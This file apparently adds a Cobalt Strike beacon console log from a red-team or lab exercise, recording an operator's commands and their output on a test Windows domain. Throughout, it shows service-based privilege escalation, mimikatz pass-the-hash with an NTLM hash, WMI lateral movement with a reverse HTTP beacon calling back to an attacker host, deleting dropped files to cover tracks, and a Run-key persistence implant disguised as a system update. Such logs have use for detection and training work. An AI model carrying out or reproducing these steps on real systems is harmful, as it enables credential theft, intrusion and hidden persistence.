@@ -1,0 +1,143 @@
+08/17 19:56:28 UTC [metadata] 192.168.23.131 <- 192.168.23.131; computer: COMPUTER02; user: jdoe *; process: update.exe; pid: 5216; os: Windows; version: 6.2; build: 9200; beacon arch: x64 (x64)
+08/17 19:57:12 UTC [input] <analyst01> sleep 1 20
+08/17 19:57:12 UTC [task] <T1029> Tasked beacon to sleep for 1s (20% jitter)
+08/17 19:57:27 UTC [checkin] host called home, sent: 16 bytes
+08/17 19:57:39 UTC [input] <analyst01> elevate svc-exe smb
+08/17 19:57:39 UTC [task] <T1035, T1050, TA0004> Tasked beacon to run windows/beacon_bind_pipe (\\.\pipe\mspipe_effe) via Service Control Manager (\\127.0.0.1\ADMIN$\e2ab98d.exe)
+08/17 19:57:39 UTC [indicator] service: \\. e2ab98d
+08/17 19:57:39 UTC [indicator] file: 53aaa7c5ebe41d350e4118da2bff5caf 289280 bytes \\127.0.0.1\ADMIN$\e2ab98d.exe
+08/17 19:57:39 UTC [checkin] host called home, sent: 291412 bytes
+08/17 19:57:39 UTC [output]
+received output:
+Started service e2ab98d on .
+
+08/17 19:57:42 UTC [output]
+established link to child beacon: 192.168.23.131
+
+08/17 20:07:19 UTC [input] <analyst01> rev2self
+08/17 20:07:19 UTC [task] <> Tasked beacon to revert token
+08/17 20:07:19 UTC [input] <analyst01> pth EXAMPLE\rrockstone 735cb4e5f8ee5e03d96841259fb28dad
+08/17 20:07:20 UTC [task] <T1075> Tasked beacon to run mimikatz's sekurlsa::pth /user:rrockstone /domain:EXAMPLE /ntlm:735cb4e5f8ee5e03d96841259fb28dad /run:"%COMSPEC% /c echo e76813ed44b > \\.\pipe\268c2f" command
+08/17 20:07:20 UTC [checkin] host called home, sent: 438835 bytes
+08/17 20:07:20 UTC [input] <analyst01> jump lateral COMPUTER03 http
+08/17 20:07:20 UTC [task] <T1546.003, TA0008> Tasked Beacon to jump to COMPUTER03 (windows/beacon_http/reverse_http (192.168.23.130:80)) via wmi shenanigans
+08/17 20:07:21 UTC [checkin] host called home, sent: 83 bytes
+08/17 20:07:21 UTC [task] <T1093, TA0008> Tasked beacon to run program: lateral.exe -w COMPUTER03
+08/17 20:07:21 UTC [output]
+Impersonated EXAMPLE\jdoe
+
+08/17 20:07:21 UTC [output]
+received output:
+user	: rrockstone
+domain	: EXAMPLE
+program	: C:\Windows\system32\cmd.exe /c echo e76813ed44b > \\.\pipe\268c2f
+impers.	: no
+NTLM	: 735cb4e5f8ee5e03d96841259fb28dad
+  |  PID  1812
+  |  TID  6012
+  |  LSA Process is now R/W
+  |  LUID 0 ; 1682680 (00000000:0019acf8)
+  \_ msv1_0   - data copy @ 0000018FB44DC460 : OK !
+  \_ kerberos - data copy @ 0000018FB4589F48
+   \_ aes256_hmac       -> null             
+   \_ aes128_hmac       -> null             
+   \_ rc4_hmac_nt       OK
+   \_ rc4_hmac_old      OK
+   \_ rc4_md4           OK
+   \_ rc4_hmac_nt_exp   OK
+   \_ rc4_hmac_old_exp  OK
+   \_ *Password replace @ 0000018FB458B428 (32) -> null
+
+
+08/17 20:07:22 UTC [checkin] host called home, sent: 412763 bytes
+08/17 20:07:23 UTC [output]
+received output:
+
+Starting lateral movement using wmi to COMPUTER03
+Writing \\COMPUTER03\C$\Windows\Temp\update.exe
+
+
+08/17 20:07:33 UTC [output]
+received output:
+Creating event filter
+Creating event consumer
+Binding filter and consumer
+
+Waiting for trigger
+
+
+
+08/17 20:08:38 UTC [output]
+received output:
+
+Event Filters: 
+Removed object
+
+Event Consumers: 
+Removed object
+
+Bindings: 
+Removed binding
+
+
+08/17 20:08:48 UTC [output]
+received output:
+Covering tracks
+Deleted \\COMPUTER03\C$\Windows\Temp\update.exe
+
+
+08/17 20:31:32 UTC [input] <analyst01> execute-assembly /home/analyst01/payloads/Persistance.exe
+08/17 20:31:32 UTC [task] <T1093> Tasked beacon to run program: Persistance.exe
+08/17 20:31:33 UTC [checkin] host called home, sent: 125495 bytes
+08/17 20:31:34 UTC [output]
+received output:
+
+	Example: Persistance.exe -a -k keyvalue -p C:\windows\temp\update.exe
+
+
+	Persistance.exe -k <keyvalue> [-a | -d | -c]
+		-a: adds persistance
+		-d: deletes persistance
+
+		-c: checks for persistance
+
+
+	Arguments:
+	-p: path to store and execute persistance from
+
+	-k: registry key name
+		default = SystemUpdateServices
+
+
+
+
+
+08/17 20:31:42 UTC [input] <analyst01> execute-assembly /home/analyst01/payloads/Persistance.exe -c
+08/17 20:31:42 UTC [task] <T1093> Tasked beacon to run program: Persistance.exe -c
+08/17 20:31:42 UTC [checkin] host called home, sent: 125519 bytes
+08/17 20:31:42 UTC [output]
+received output:
+
+Registry HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run Values:
+OneDrive
+<Hidden registry value>
+
+Persistance found
+
+
+08/17 20:31:51 UTC [input] <analyst01> execute-assembly /home/analyst01/payloads/Persistance.exe -d
+08/17 20:31:51 UTC [task] <T1093> Tasked beacon to run program: Persistance.exe -d
+08/17 20:31:52 UTC [checkin] host called home, sent: 125523 bytes
+08/17 20:31:52 UTC [output]
+received output:
+Removed file: C:\Windows\Tasks\systemupdate.exe
+Successfully removed registry value: HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\SystemUpdateServices
+
+
+08/17 20:42:13 UTC [error] lost link to child beacon: 192.168.23.131
+08/17 20:43:12 UTC [input] <analyst01> exit
+08/17 20:43:12 UTC [task] <> Tasked beacon to exit
+08/17 20:43:12 UTC [checkin] host called home, sent: 8 bytes
+08/17 20:43:12 UTC [output]
+beacon exit.
+
